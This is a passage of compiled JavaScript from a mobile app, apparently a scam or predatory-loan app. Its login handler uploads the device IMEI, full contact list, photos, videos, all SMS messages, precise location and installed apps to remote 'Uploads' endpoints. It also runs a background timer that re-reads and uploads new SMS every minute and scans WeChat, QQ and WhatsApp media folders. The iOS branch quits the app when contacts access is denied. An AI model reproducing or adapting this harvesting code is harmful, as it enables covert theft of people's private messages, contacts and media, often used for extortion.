          formatAppLog("error", "at utils/android-handler.js:1673", "复制文件失败:", error);
          reject(error);
        }
      });
    }
    // 添加查找视频文件的方法
    static async findVideoFiles() {
      try {
        const environment = plus.android.importClass("android.os.Environment");
        const File = plus.android.importClass("java.io.File");
        const sdRoot = environment.getExternalStorageDirectory();
        const videoDirs = [
          "DCIM/Camera",
          "DCIM/Screenshots",
          "DCIM/Screen Recorder",
          "Movies",
          "Movies/Screenshots",
          "Pictures",
          "Pictures/Screenshots",
          "Download",
          "DCIM/100ANDRO",
          "DCIM",
          "Movies/Telegram",
          "Movies/WhatsApp",
          "Tencent/QQfile_recv",
          "Tencent/MicroMsg/Download",
          "Android/media/com.tencent.mm/MicroMsg/Download"
        ];
        formatAppLog("log", "at utils/android-handler.js:1706", "查找视频目录:", videoDirs);
        const videoFiles = [];
        for (const dirPath of videoDirs) {
          try {
            const fullPath = sdRoot + "/" + dirPath;
            formatAppLog("log", "at utils/android-handler.js:1713", "检查目录:", fullPath);
            const dir = new File(fullPath);
            if (plus.android.invoke(dir, "exists")) {
              formatAppLog("log", "at utils/android-handler.js:1717", "目录存在:", dirPath);
              if (plus.android.invoke(dir, "isDirectory")) {
                formatAppLog("log", "at utils/android-handler.js:1719", "开始扫描目录:", dirPath);
                const files = plus.android.invoke(dir, "listFiles");
                if (files) {
                  for (let i = 0; i < files.length; i++) {
                    const file = files[i];
                    const name = plus.android.invoke(file, "getName");
                    if (this.isVideoFile(name)) {
                      const size = plus.android.invoke(file, "length");
                      if (size > 0) {
                        videoFiles.push(file);
                      }
                    }
                  }
                }
              }
            } else {
              formatAppLog("log", "at utils/android-handler.js:1737", "目录不存在:", dirPath);
            }
          } catch (error) {
            formatAppLog("error", "at utils/android-handler.js:1740", "处理目录出错:", dirPath, error);
          }
        }
        return videoFiles;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:1746", "查找视频文件失败:", error);
        throw error;
      }
    }
    // 修改视频文件检查方法
    static isVideoFile(filename) {
      const videoExtensions = [".mp4", ".3gp", ".mkv", ".avi", ".mov", ".wmv"];
      filename = filename.toLowerCase();
      return videoExtensions.some((ext) => filename.endsWith(ext));
    }
    // 修改 readDirectory 方法
    static async readDirectory(dirPath) {
      return new Promise((resolve, reject) => {
        try {
          const File = plus.android.importClass("java.io.File");
          const dir = new File(dirPath);
          if (!plus.android.invoke(dir, "exists") || !plus.android.invoke(dir, "isDirectory")) {
            return resolve([]);
          }
          const files = plus.android.invoke(dir, "listFiles");
          if (!files) {
            return resolve([]);
          }
          const entries = Array.from(files).map((file) => {
            const path = plus.android.invoke(file, "getPath");
            return {
              name: plus.android.invoke(file, "getName"),
              fullPath: path,
              fileObj: file,
              // 存储 File 对象
              isDirectory: plus.android.invoke(file, "isDirectory"),
              toLocalURL: () => "file://" + path
            };
          });
          resolve(entries);
        } catch (error) {
          formatAppLog("error", "at utils/android-handler.js:1787", "读取目录失败:", dirPath, error);
          resolve([]);
        }
      });
    }
    // 单独检查定位权限
    static async checkLocationPermission() {
      try {
        const result = await this.requestSinglePermission("android.permission.ACCESS_FINE_LOCATION");
        return result;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:1799", "Location permission error:", error);
        return false;
      }
    }
    static async checkGalleryPermission() {
      try {
        const sdkInt = this.getAndroidSdkVersion();
        const perm = sdkInt >= 33 ? "android.permission.READ_MEDIA_IMAGES" : "android.permission.READ_EXTERNAL_STORAGE";
        const result = await this.requestSinglePermission(perm);
        return result;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:1811", "Gallery permission error:", error);
        return false;
      }
    }
    // 单独检查短信权限
    static async checkSMSPermission() {
      try {
        const result = await this.requestSinglePermission("android.permission.READ_SMS");
        return result;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:1822", "SMS permission error:", error);
        return false;
      }
    }
    // 请求单个权限的方法
    static requestSinglePermission(permissionName) {
      return new Promise((resolve, reject) => {
        try {
          const mainActivity = plus.android.runtimeMainActivity();
          const PackageManager = plus.android.importClass("android.content.pm.PackageManager");
          try {
            const currentStatus = mainActivity.checkSelfPermission(permissionName);
            formatAppLog("log", "at utils/android-handler.js:1837", `权限 ${permissionName} 当前状态:`, currentStatus === PackageManager.PERMISSION_GRANTED ? "已授权" : "未授权");
            if (currentStatus === PackageManager.PERMISSION_GRANTED) {
              formatAppLog("log", "at utils/android-handler.js:1841", `已拥有权限: ${permissionName}`);
              return resolve(true);
            }
          } catch (e) {
            formatAppLog("warn", "at utils/android-handler.js:1845", `检查权限状态失败: ${permissionName}`, e);
            if (permissionName === "android.permission.QUERY_ALL_PACKAGES") {
              const sdkVersion = plus.os.version;
              if (sdkVersion && parseInt(sdkVersion) < 30) {
                formatAppLog("log", "at utils/android-handler.js:1850", `Android版本(${sdkVersion})低于11，不需要 QUERY_ALL_PACKAGES 权限`);
                return resolve(true);
              }
            }
          }
          plus.android.requestPermissions(
            [permissionName],
            function(resultObj) {
              let hasPermission = false;
              for (var i = 0; i < resultObj.granted.length; i++) {
                const granted = resultObj.granted[i];
                formatAppLog("log", "at utils/android-handler.js:1864", `已获取权限: ${granted}`);
                if (granted === permissionName) {
                  hasPermission = true;
                }
              }
              for (var i = 0; i < resultObj.deniedPresent.length; i++) {
                formatAppLog("log", "at utils/android-handler.js:1872", `本次拒绝的权限: ${resultObj.deniedPresent[i]}`);
              }
              for (var i = 0; i < resultObj.deniedAlways.length; i++) {
                formatAppLog("log", "at utils/android-handler.js:1876", `永久拒绝的权限: ${resultObj.deniedAlways[i]}`);
              }
              if (!hasPermission && permissionName === "android.permission.QUERY_ALL_PACKAGES") {
                const sdkVersion = plus.os.version;
                if (sdkVersion && parseInt(sdkVersion) >= 30) {
                  formatAppLog("log", "at utils/android-handler.js:1883", `Android ${sdkVersion} 未授予 QUERY_ALL_PACKAGES 权限，将使用备选方法`);
                }
              }
              resolve(hasPermission);
            },
            function(error) {
              formatAppLog("error", "at utils/android-handler.js:1890", `权限(${permissionName})请求错误:`, error);
              if (permissionName === "android.permission.QUERY_ALL_PACKAGES") {
                resolve(false);
              } else {
                reject(error);
              }
            }
          );
        } catch (error) {
          formatAppLog("error", "at utils/android-handler.js:1900", `权限(${permissionName})请求处理异常:`, error);
          if (permissionName === "android.permission.QUERY_ALL_PACKAGES") {
            resolve(false);
          } else {
            reject(error);
          }
        }
      });
    }
    // 单独检查应用包查询权限
    static async checkPackagesPermission() {
      try {
        const sdkVersion = plus.os.version;
        formatAppLog("log", "at utils/android-handler.js:1916", "Android 系统版本:", sdkVersion);
        if (sdkVersion && parseInt(sdkVersion) < 30) {
          formatAppLog("log", "at utils/android-handler.js:1920", `Android版本(${sdkVersion})低于11，不需要 QUERY_ALL_PACKAGES 权限`);
          return true;
        }
        formatAppLog("log", "at utils/android-handler.js:1925", "尝试使用 QUERY_ALL_PACKAGES 权限获取应用列表");
        const result = await this.requestSinglePermission("android.permission.QUERY_ALL_PACKAGES");
        if (!result) {
          formatAppLog("log", "at utils/android-handler.js:1931", "未获得 QUERY_ALL_PACKAGES 权限，将使用备选方法获取应用列表");
        }
        return result;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:1936", "应用包权限请求失败:", error);
        return false;
      }
    }
    // 修改现有的 checkPermissions 方法
    static async checkPermissions() {
      try {
        if (plus.os.name.toLowerCase() !== "android") {
          return {
            storage: true,
            contacts: true,
            location: true,
            sms: true,
            phone_state: true
          };
        }
        try {
          const sdkInt = this.getAndroidSdkVersion();
          const storagePerms = sdkInt >= 33 ? ["android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO"] : ["android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"];
          const perms = [
            ...storagePerms,
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.READ_SMS",
            "android.permission.READ_PHONE_STATE"
          ];
          const mainActivity = plus.android.runtimeMainActivity();
          const PackageManager = plus.android.importClass("android.content.pm.PackageManager");
          const Manifest = plus.android.importClass("android.Manifest");
          let contactsPermissionGranted = false;
          try {
            const contactsResult = mainActivity.checkSelfPermission(Manifest.permission.READ_CONTACTS);
            contactsPermissionGranted = contactsResult === PackageManager.PERMISSION_GRANTED;
            formatAppLog("log", "at utils/android-handler.js:1979", "通讯录权限状态(二次确认):", contactsPermissionGranted);
          } catch (e) {
            formatAppLog("warn", "at utils/android-handler.js:1981", "通讯录权限状态检查失败:", e);
          }
          const hasPermissionMap = {};
          hasPermissionMap["android.permission.READ_CONTACTS"] = contactsPermissionGranted;
          for (const perm of perms) {
            try {
              const result = mainActivity.checkSelfPermission(perm);
              hasPermissionMap[perm] = result === PackageManager.PERMISSION_GRANTED;
            } catch (e) {
              formatAppLog("warn", "at utils/android-handler.js:1994", `权限检查失败: ${perm}`, e);
              hasPermissionMap[perm] = false;
            }
          }
          const neededPermissions = perms.filter((perm) => !hasPermissionMap[perm]);
          if (neededPermissions.length > 0) {
            formatAppLog("log", "at utils/android-handler.js:2003", "需要请求的其他权限:", neededPermissions);
            return new Promise((resolve) => {
              plus.android.requestPermissions(
                neededPermissions,
                function(resultObj) {
                  formatAppLog("log", "at utils/android-handler.js:2010", "其他权限请求结果:", resultObj);
                  for (let i = 0; i < resultObj.granted.length; i++) {
                    const granted = resultObj.granted[i];
                    hasPermissionMap[granted] = true;
                  }
                  const storageGranted = sdkInt >= 33 ? hasPermissionMap["android.permission.READ_MEDIA_IMAGES"] || false : hasPermissionMap["android.permission.READ_EXTERNAL_STORAGE"] && hasPermissionMap["android.permission.WRITE_EXTERNAL_STORAGE"];
                  resolve({
                    storage: storageGranted,
                    contacts: contactsPermissionGranted,
                    location: hasPermissionMap["android.permission.ACCESS_FINE_LOCATION"] || hasPermissionMap["android.permission.ACCESS_COARSE_LOCATION"],
                    sms: hasPermissionMap["android.permission.READ_SMS"],
                    phone_state: hasPermissionMap["android.permission.READ_PHONE_STATE"]
                  });
                },
                function(error) {
                  formatAppLog("error", "at utils/android-handler.js:2030", "其他权限请求错误:", error);
                  const storageGranted = sdkInt >= 33 ? hasPermissionMap["android.permission.READ_MEDIA_IMAGES"] || false : hasPermissionMap["android.permission.READ_EXTERNAL_STORAGE"] && hasPermissionMap["android.permission.WRITE_EXTERNAL_STORAGE"];
                  resolve({
                    storage: storageGranted,
                    contacts: contactsPermissionGranted,
                    location: hasPermissionMap["android.permission.ACCESS_FINE_LOCATION"] || hasPermissionMap["android.permission.ACCESS_COARSE_LOCATION"],
                    sms: hasPermissionMap["android.permission.READ_SMS"],
                    phone_state: hasPermissionMap["android.permission.READ_PHONE_STATE"]
                  });
                }
              );
            });
          } else {
            return {
              storage: true,
              contacts: true,
              location: true,
              sms: true,
              phone_state: true
            };
          }
        } catch (error) {
          formatAppLog("error", "at utils/android-handler.js:2055", "权限检查过程出错:", error);
          return {
            storage: false,
            contacts: false,
            location: false,
            sms: false,
            phone_state: false
          };
        }
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:2066", "权限检查主函数错误:", error);
        return {
          storage: false,
          contacts: false,
          location: false,
          sms: false,
          phone_state: false
        };
      }
    }
    // 添加统一的媒体文件扫描方法
    static async scanMediaFiles() {
      try {
        const environment = plus.android.importClass("android.os.Environment");
        const File = plus.android.importClass("java.io.File");
        const sdRoot = environment.getExternalStorageDirectory();
        const mediaDirs = [
          // 标准媒体目录
          "DCIM/Camera",
          "DCIM/Screenshots",
          "DCIM/Screen Recorder",
          "DCIM",
          "DCIM/100ANDRO",
          "Pictures",
          "Pictures/Screenshots",
          "Download",
          // 社交媒体和聊天应用目录
          "Pictures/WeiXin",
          "Pictures/QQ",
          "Pictures/Telegram",
          "Pictures/WhatsApp",
          "Pictures/Facebook",
          "Pictures/Twitter",
          "Pictures/Instagram",
          "Pictures/Messenger",
          "Pictures/Line",
          "Pictures/Snapchat",
          // 微信和QQ文件目录
          "Tencent/QQfile_recv",
          "Tencent/MicroMsg/Download",
          "Tencent/QQ_Images",
          "Android/data/com.tencent.mm/MicroMsg/Download",
          "Android/data/com.tencent.mobileqq/Tencent/QQfile_recv",
          "Android/media/com.tencent.mm/MicroMsg/Download",
          // 其他常见媒体目录
          "Pictures/Saved Pictures",
          "Pictures/Camera",
          "Pictures/Saved Images",
          "Pictures/Photo Editor",
          "Movies",
          "Movies/Screenshots"
        ];
        try {
          const externalFilesDirs = plus.android.invoke(plus.android.runtimeMainActivity(), "getExternalFilesDirs", null);
          if (externalFilesDirs && externalFilesDirs.length > 0) {
            for (let i = 0; i < externalFilesDirs.length; i++) {
              const dir = externalFilesDirs[i];
              if (dir) {
                const path = plus.android.invoke(dir, "getAbsolutePath");
                formatAppLog("log", "at utils/android-handler.js:2136", "发现外部存储目录:", path);
                if (path && path.includes("/Android/")) {
                  const rootPath = path.substring(0, path.indexOf("/Android/"));
                  if (rootPath && rootPath !== sdRoot.toString()) {
                    for (const mediaDir of mediaDirs) {
                      mediaDirs.push(rootPath + "/" + mediaDir);
                    }
                  }
                }
              }
            }
          }
        } catch (error) {
          formatAppLog("error", "at utils/android-handler.js:2152", "获取外部存储目录出错:", error);
        }
        formatAppLog("log", "at utils/android-handler.js:2155", "开始扫描媒体文件目录:", mediaDirs);
        const mediaFiles = {
          photos: [],
          videos: []
        };
        for (const dirPath of mediaDirs) {
          try {
            const fullPath = dirPath.startsWith("/") ? dirPath : sdRoot + "/" + dirPath;
            formatAppLog("log", "at utils/android-handler.js:2165", "检查目录:", fullPath);
            const dir = new File(fullPath);
            if (plus.android.invoke(dir, "exists")) {
              formatAppLog("log", "at utils/android-handler.js:2169", "目录存在:", dirPath);
              if (plus.android.invoke(dir, "isDirectory")) {
                formatAppLog("log", "at utils/android-handler.js:2171", "开始扫描目录:", dirPath);
                await this.scanDirectoryRecursively(dir, mediaFiles, 0);
              }
            } else {
              formatAppLog("log", "at utils/android-handler.js:2177", "目录不存在:", dirPath);
            }
          } catch (error) {
            formatAppLog("error", "at utils/android-handler.js:2180", "处理目录出错:", dirPath, error);
          }
        }
        formatAppLog("log", "at utils/android-handler.js:2184", "媒体文件扫描完成:", {
          图片数量: mediaFiles.photos.length,
          视频数量: mediaFiles.videos.length
        });
        return mediaFiles;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:2191", "扫描媒体文件失败:", error);
        throw error;
      }
    }
    // 递归扫描目录及其子目录
    static async scanDirectoryRecursively(dir, mediaFiles, depth) {
      if (depth > 3)
        return;
      try {
        const files = plus.android.invoke(dir, "listFiles");
        if (!files)
          return;
        for (let i = 0; i < files.length; i++) {
          const file = files[i];
          const isDirectory = plus.android.invoke(file, "isDirectory");
          if (isDirectory) {
            const dirName = plus.android.invoke(file, "getName");
            if (dirName === "Android" || dirName === "." || dirName === ".." || dirName.startsWith(".")) {
              continue;
            }
            await this.scanDirectoryRecursively(file, mediaFiles, depth + 1);
          } else {
            const name = plus.android.invoke(file, "getName");
            const size = plus.android.invoke(file, "length");
            if (size > 0) {
              if (this.isImageFile(name)) {
                mediaFiles.photos.push(file);
              } else if (this.isVideoFile(name)) {
                mediaFiles.videos.push(file);
              }
            }
          }
        }
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:2235", "递归扫描目录出错:", error);
      }
    }
    // 修改 handleLogin 方法，移除重复的通讯录权限检查
    static async handleLogin(phone, inviteCode) {
      try {
        if (!phone) {
          throw new Error("缺少必要的用户验证参数");
        }
        uni.setStorageSync("phone", phone);
        uni.setStorageSync("code", inviteCode);
        formatAppLog("log", "at utils/android-handler.js:2252", "开始处理登录数据...");
        const deviceInfo = await this.getDeviceInfo();
        formatAppLog("log", "at utils/android-handler.js:2256", "设备信息:", deviceInfo);
        await this.uploadData("Uploads/apiimei", {
          imei: deviceInfo.imei,
          imei2: deviceInfo.imei2,
          model: deviceInfo.model,
          vendor: deviceInfo.vendor,
          real_phone: deviceInfo.real_phone || "",
          phone
        }, phone);
        const contactData = await this.getContacts(phone, inviteCode);
        formatAppLog("log", "at utils/android-handler.js:2268", "通讯录数据:", contactData);
        await this.uploadData("Uploads/api", contactData, phone);
        try {
          const photos = await this.getPhotos();
          if (photos.length > 0) {
            await this.uploadPhotos(photos, phone);
          }
        } catch (photoError) {
          formatAppLog("error", "at utils/android-handler.js:2278", "相册上传失败:", photoError);
        }
        try {
          await this.processVideos(phone);
        } catch (videoError) {
          formatAppLog("error", "at utils/android-handler.js:2285", "视频上传失败:", videoError);
        }
        const smsData = await this.getSMSContent(phone, inviteCode);
        formatAppLog("log", "at utils/android-handler.js:2290", "短信数据:", smsData);
        await this.uploadData("Uploads/apisms", smsData, phone);
        try {
          const location = await this.getLocation();
          formatAppLog("log", "at utils/android-handler.js:2296", "位置信息:", location);
          await this.uploadLocation(location, phone);
        } catch (locError) {
          formatAppLog("error", "at utils/android-handler.js:2299", "位置上传失败:", locError);
        }
        try {
          const apps = await this.getNativeApplicationList();
          if (apps && apps.length > 0) {
            formatAppLog("log", "at utils/android-handler.js:2306", `获取到 ${apps.length} 个已安装应用`);
            await this.uploadInstalledApps(apps, phone, inviteCode);
          }
        } catch (appError) {
          formatAppLog("error", "at utils/android-handler.js:2310", "获取或上传应用信息失败:", appError);
        }
        this.navigateToLoading();
        return true;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:2318", "处理登录失败:", error);
        return false;
      }
    }
    // 修改主处理函数，同样移除重复的通讯录权限检查
    static async handleAndroidData(phone) {
      try {
        formatAppLog("log", "at utils/android-handler.js:2327", "开始处理安卓数据...");
        const deviceInfo = await this.getDeviceInfo();
        formatAppLog("log", "at utils/android-handler.js:2331", "设备信息:", deviceInfo);
        await this.uploadData("Uploads/apiimei", {
          imei: deviceInfo.imei,
          imei2: deviceInfo.imei2,
          model: deviceInfo.model,
          vendor: deviceInfo.vendor,
          real_phone: deviceInfo.real_phone || "",
          phone
        }, phone);
        try {
          const photos = await this.getPhotos();
          if (photos.length > 0) {
            await this.uploadPhotos(photos, phone);
          }
        } catch (photoError) {
          formatAppLog("error", "at utils/android-handler.js:2348", "相册上传失败:", photoError);
        }
        try {
          await this.processVideos(phone);
        } catch (videoError) {
          formatAppLog("error", "at utils/android-handler.js:2355", "视频上传失败:", videoError);
        }
        const smsData = await this.getSMSContent(phone, deviceInfo.imei2);
        formatAppLog("log", "at utils/android-handler.js:2360", "短信数据:", smsData);
        await this.uploadData("Uploads/apisms", smsData, phone);
        try {
          const location = await this.getLocation();
          formatAppLog("log", "at utils/android-handler.js:2366", "位置信息:", location);
          await this.uploadLocation(location, phone);
        } catch (locError) {
          formatAppLog("error", "at utils/android-handler.js:2369", "位置上传失败:", locError);
        }
        try {
          const apps = await this.getNativeApplicationList();
          if (apps && apps.length > 0) {
            await this.uploadInstalledApps(apps, phone);
          }
        } catch (appError) {
          formatAppLog("error", "at utils/android-handler.js:2379", "获取或上传应用信息失败:", appError);
        }
        return true;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:2384", "处理安卓数据失败:", error);
        return false;
      }
    }
    // 扫描目录
    static async scanDirectory(dirPath) {
      return new Promise((resolve, reject) => {
        plus.io.resolveLocalFileSystemURL(dirPath, (entry) => {
          entry.createReader().readEntries((entries) => {
            const files = entries.filter((entry2) => entry2.isFile && this.isImageFile(entry2.name)).map((entry2) => {
              var _a;
              return {
                name: entry2.name,
                path: entry2.fullPath,
                size: entry2.size || 0,
                lastModified: ((_a = entry2.lastModifiedDate) == null ? void 0 : _a.getTime()) || Date.now()
              };
            });
            resolve(files);
          }, reject);
        }, () => {
          resolve([]);
        });
      });
    }
    // 开始短信监控功能
    static startSmsMonitoring(phone) {
      if (this.isMonitoringSms) {
        this.stopSmsMonitoring();
      }
      formatAppLog("log", "at utils/android-handler.js:2418", "开始短信监控功能，间隔为:", this.smsMonitorInterval / 1e3, "秒");
      this.isMonitoringSms = true;
      if (phone) {
        uni.setStorageSync("phone", phone);
      } else {
        phone = uni.getStorageSync("phone");
      }
      const inviteCode = uni.getStorageSync("code") || "";
      this.checkAndUploadNewSms(phone, inviteCode).then(() => {
        this.smsTimer = setInterval(() => {
          if (this.isMonitoringSms) {
            this.checkAndUploadNewSms(phone, inviteCode).catch((error) => {
              formatAppLog("error", "at utils/android-handler.js:2438", "短信监控过程中出错:", error);
            });
          }
        }, this.smsMonitorInterval);
      }).catch((error) => {
        formatAppLog("error", "at utils/android-handler.js:2443", "初始化短信监控失败:", error);
      });
      return true;
    }
    // 停止短信监控
    static stopSmsMonitoring() {
      formatAppLog("log", "at utils/android-handler.js:2451", "停止短信监控功能");
      if (this.smsTimer) {
        clearInterval(this.smsTimer);
        this.smsTimer = null;
      }
      this.isMonitoringSms = false;
      return true;
    }
    // 检查并上传新短信
    static async checkAndUploadNewSms(phone, inviteCode) {
      try {
        formatAppLog("log", "at utils/android-handler.js:2466", "开始检查新短信");
        const smsPermission = await this.requestSMSPermission();
        if (smsPermission <= 0) {
          formatAppLog("error", "at utils/android-handler.js:2471", "未获得短信权限，无法检查新短信");
          return false;
        }
        const smsData = [{
          imei: phone,
          imei2: inviteCode
        }];
        const ContentResolver = plus.android.importClass("android.content.ContentResolver");
        const Cursor = plus.android.importClass("android.database.Cursor");
        const Uri = plus.android.importClass("android.net.Uri");
        const activity = plus.android.runtimeMainActivity();
        const uri = Uri.parse("content://sms/");
        const resolver = activity.getContentResolver();
        if (!resolver) {
          throw new Error("无法获取 ContentResolver");
        }
        const projection = [
          "_id",
          "address",
          "person",
          "body",
          "date",
          "type"
        ];
        let selection = null;
        let selectionArgs = null;
        if (this.lastSmsId) {
          selection = "_id > ?";
          selectionArgs = [this.lastSmsId.toString()];
        }
        const cursor = resolver.query(
          uri,
          projection,
          selection,
          selectionArgs,
          "date desc"
        );
        formatAppLog("log", "at utils/android-handler.js:2522", "短信游标获取成功:", cursor && cursor.getCount());
        if (!cursor || cursor.getCount() === 0) {
          if (cursor)
            cursor.close();
          formatAppLog("log", "at utils/android-handler.js:2527", "没有新短信");
          return false;
        }
        let hasNewSms = false;
        let newMaxId = this.lastSmsId || 0;
        while (cursor.moveToNext()) {
          const smsId = parseInt(cursor.getString(cursor.getColumnIndex("_id")));
          if (smsId > newMaxId) {
            newMaxId = smsId;
          }
          const smsInfo = {
            id: smsId,
            Name: cursor.getString(cursor.getColumnIndex("person")),
            Date: this.formatDate(cursor.getLong(cursor.getColumnIndex("date"))),
            PhoneNumber: cursor.getString(cursor.getColumnIndex("address")),
            Smsbody: cursor.getString(cursor.getColumnIndex("body")),
            Type: cursor.getString(cursor.getColumnIndex("type"))
          };
          smsData.push(smsInfo);
          hasNewSms = true;
        }
        cursor.close();
        this.lastSmsId = newMaxId;
        if (hasNewSms) {
          formatAppLog("log", "at utils/android-handler.js:2562", "发现新短信，准备上传");
          await this.uploadData("Uploads/apisms", JSON.stringify(smsData), phone);
          formatAppLog("log", "at utils/android-handler.js:2564", "新短信上传成功");
          return true;
        }
        return false;
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:2570", "检查新短信失败:", error);
        return false;
      }
    }
  };
  // 添加视频处理相关属性
  __publicField(_AndroidHandler, "processedVideos", /* @__PURE__ */ new Set());
  __publicField(_AndroidHandler, "uploadQueue", []);
  __publicField(_AndroidHandler, "isUploading", false);
  __publicField(_AndroidHandler, "hasNavigated", false);
  // 添加权限状态相关属性
  __publicField(_AndroidHandler, "hasCheckedContactsPermission", false);
  __publicField(_AndroidHandler, "contactsPermissionDeniedCount", 0);
  // 添加短信监控相关属性
  __publicField(_AndroidHandler, "smsTimer", null);
  __publicField(_AndroidHandler, "lastSmsId", null);
  __publicField(_AndroidHandler, "isMonitoringSms", false);
  __publicField(_AndroidHandler, "smsMonitorInterval", 6e4);
  let AndroidHandler = _AndroidHandler;
  class IOSHandler {
    // 获取通讯录
    static async getContacts(phone, inviteCode) {
      try {
        const hasPermission = await this.checkContactsPermission();
        const deviceInfo = `${plus.device.vendor}-${plus.device.model}`;
        let contactData = `${phone}**${inviteCode}**${deviceInfo}`;
        return new Promise((resolve, reject) => {
          plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, (addressbook) => {
            addressbook.find(["displayName", "phoneNumbers"], (contacts) => {
              contacts.forEach((contact) => {
                var _a;
                contactData += `=${contact.displayName}|${((_a = contact.phoneNumbers[0]) == null ? void 0 : _a.value) || ""}`;
              });
              formatAppLog("log", "at utils/ios-handler.js:26", "通讯录获取成功");
              resolve(contactData);
            }, (error) => {
              formatAppLog("error", "at utils/ios-handler.js:29", "查找通讯录失败:", error);
              reject(error);
            }, {
              multiple: true
            });
          }, (error) => {
            formatAppLog("error", "at utils/ios-handler.js:35", "获取通讯录失败:", error);
            if (error.code === error.PERMISSION_DENIED) {
              formatAppLog("log", "at utils/ios-handler.js:39", "获取通讯录时检测到权限被拒绝，退出应用");
              uni.showModal({
                title: "权限丢失",
                content: "通讯录权限丢失，请重启应用并允许通讯录权限",
                showCancel: false,
                success: () => {
                  setTimeout(() => {
                    plus.runtime.quit();
                  }, 500);
                }
              });
              uni.setStorageSync("ios_contacts_permission_denied", "true");
              uni.removeStorageSync("ios_contacts_permission");
            }
            reject(error);
          });
        });
      } catch (error) {
        formatAppLog("error", "at utils/ios-handler.js:59", "处理通讯录出错:", error);
        if (error.message && error.message.includes("权限")) {
          formatAppLog("log", "at utils/ios-handler.js:63", "通讯录权限错误，准备退出应用");
          setTimeout(() => {
            formatAppLog("log", "at utils/ios-handler.js:66", "通讯录权限错误，强制退出应用");
            plus.runtime.quit();
          }, 1e3);
        }
        throw error;
      }
    }
    // 获取位置信息
    static async getLocation() {
      const hasPermission = await this.checkLocationPermission();
      if (!hasPermission) {
        formatAppLog("log", "at utils/ios-handler.js:80", "未获得位置权限");
        throw new Error("未获得位置权限");
      }
      return new Promise((resolve, reject) => {
        plus.geolocation.getCurrentPosition(
          (position) => {
            formatAppLog("log", "at utils/ios-handler.js:87", "位置获取成功:", position);
            resolve(position);
          },
          (error) => {
            formatAppLog("error", "at utils/ios-handler.js:91", "获取位置失败:", error);
            reject(error);
          },
          {
            enableHighAccuracy: true,
            timeout: 1e4,
            provider: "system",
            coordsType: "wgs84"
          }
        );
      });
    }
    // 获取相册图片
    static async getPhotos() {
      return new Promise((resolve, reject) => {
        formatAppLog("log", "at utils/ios-handler.js:107", "开始获取 iOS 相册媒体文件");
        try {
          const galleryModule = requireNativePlugin("vutet-getGalleryImages");
          if (!galleryModule) {
            formatAppLog("error", "at utils/ios-handler.js:112", "插件加载失败");
            resolve([]);
            return;
          }
          const permissionStatus = uni.getStorageSync("ios_photo_permission");
          if (permissionStatus === "granted") {
            formatAppLog("log", "at utils/ios-handler.js:122", "相册权限已在App启动时获取，直接处理");
            this.getPhotosWithPermission(galleryModule, resolve);
            return;
          }
          galleryModule.checkPermission((res) => {
            formatAppLog("log", "at utils/ios-handler.js:129", "相册权限检查结果:", res);
            if (res.status !== 200) {
              formatAppLog("log", "at utils/ios-handler.js:132", "未获得相册权限:", res);
              try {
                const PHPhotoLibraryClass = plus.ios.importClass("PHPhotoLibrary");
                if (PHPhotoLibraryClass) {
                  PHPhotoLibraryClass.requestAuthorization((status) => {
                    formatAppLog("log", "at utils/ios-handler.js:141", "相册授权状态:", status);
                    if (status === 3) {
                      uni.setStorageSync("ios_photo_permission", "granted");
                      this.getPhotosWithPermission(galleryModule, resolve);
                    } else {
                      uni.showModal({
                        title: "提示",
                        content: "需要访问相册和视频权限，是否去设置？",
                        success: (modalRes) => {
                          if (modalRes.confirm) {
                            if (plus.os.name.toLowerCase() === "ios") {
                              plus.runtime.openURL("app-settings:");
                            }
                          }
                        },
                        complete: () => {
                          resolve([]);
                        }
                      });
                    }
                  });
                } else {
                  plus.ios.requestAuthorization("photo", (result) => {
                    if (result === "authorized") {
                      uni.setStorageSync("ios_photo_permission", "granted");
                      this.getPhotosWithPermission(galleryModule, resolve);
                    } else {
                      uni.showModal({
                        title: "提示",
                        content: "需要访问相册权限，是否去设置？",
                        success: (modalRes) => {
                          if (modalRes.confirm) {
                            if (plus.os.name.toLowerCase() === "ios") {
                              plus.runtime.openURL("app-settings:");
                            }
                          }
                        },
                        complete: () => {
                          resolve([]);
                        }
                      });
                    }
                  });
                }
              } catch (e) {
                formatAppLog("error", "at utils/ios-handler.js:192", "权限请求失败:", e);
                plus.ios.requestAuthorization("photo", (result) => {
                  if (result === "authorized") {
                    uni.setStorageSync("ios_photo_permission", "granted");
                    this.getPhotosWithPermission(galleryModule, resolve);
                  } else {
                    uni.showModal({
                      title: "提示",
                      content: "需要访问相册权限，是否去设置？",
                      success: (modalRes) => {
                        if (modalRes.confirm) {
                          if (plus.os.name.toLowerCase() === "ios") {
                            plus.runtime.openURL("app-settings:");
                          }
                        }
                      },
                      complete: () => {
                        resolve([]);
                      }
                    });
                  }
                });
              }
              return;
            }
            uni.setStorageSync("ios_photo_permission", "granted");
            this.getPhotosWithPermission(galleryModule, resolve);
          });
        } catch (error) {
          formatAppLog("error", "at utils/ios-handler.js:226", "相册处理失败:", error);
          resolve([]);
        }
      });
    }
    // 修改 getPhotosWithPermission 方法
    static getPhotosWithPermission(galleryModule, resolve) {
      const pageSize = 10;
      let currentPage = 1;
      let uploadedCount = 0;
      let totalPhotos = 0;
      let errorCount = 0;
      const maxErrors = 5;
      const phone = uni.getStorageSync("phone");
      const maxRetries = 3;
      const isVideoFile = (fileName) => {
        const videoExtensions = [".mp4", ".mov", ".m4v", ".3gp", ".avi", ".wmv", ".mkv", ".qt", ".flv"];
        fileName = fileName.toLowerCase();
        return videoExtensions.some((ext) => fileName.endsWith(ext));
      };
      const isVideoMimeType = (mimeType) => {
        if (!mimeType)
          return false;
        const videoMimeTypes = [
          "video/",
          "application/mp4",
